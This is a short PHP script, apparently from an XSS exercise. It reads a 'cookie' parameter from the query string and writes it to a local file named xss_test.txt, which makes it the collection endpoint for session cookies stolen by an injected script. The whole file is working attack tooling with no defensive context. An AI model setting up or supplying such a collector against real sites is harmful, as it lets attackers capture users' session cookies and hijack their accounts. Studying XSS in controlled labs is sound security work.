<?php
    $cookie=$_GET['cookie'];
    $save_file=fopen("C:\xss_test.txt","w");
    fwrite($save_file,$cookie);
    fclose($save_file);
?>